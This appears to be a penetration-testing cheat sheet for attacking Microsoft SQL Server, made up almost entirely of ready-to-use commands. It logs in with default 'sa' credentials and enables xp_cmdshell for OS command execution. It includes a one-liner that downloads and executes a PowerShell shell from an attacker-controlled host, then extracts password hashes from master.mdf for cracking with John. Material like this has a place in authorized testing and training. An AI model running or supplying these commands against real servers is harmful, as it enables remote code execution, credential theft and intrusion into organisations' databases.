# 1443 - MSSql

---

- [Interaction](#interaction)
- [Commands](#commands)
- [Credentials](#credentials)

> {info} **MSSql** stands for **Microsoft Structured Query Language**

<a name="interaction"></a>
## Interaction

```sh
mssqlclient.py sa:password@__VICTIM_IP__
```

<a name="commands"></a>
## Commands

Get the Microsoft SQL version.
```sql
SELECT @@version;
```

Attempt to enable code execution.
```sql
enable_xp_cmdshell;
```

Run commands after enabling code execution.
```sql
EXEC xp_cmdshell whoami
```

Download and execute shell from attacker.
```sql
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://__ATTACKER_IP__/shell.ps1") | powershell -noprofile'
```

<a name="credentials"></a>
## Credentials

Microsoft SQL credentials are stored in `master.mdf`. An example location can be found below.
```sh
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf
```

You can retrieve the hashes from the mdf file using [Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes) in PowerShell.
```sh
Add-Type -Path 'OrcaMDF.RawCore.dll'
Add-Type -Path 'OrcaMDF.Framework.dll'
import-module .\Get-MDFHashes.ps1
Get-MDFHashes -mdf "C:\Users\admin\Desktop\master.mdf"
```
John can then be used to crack the hash.
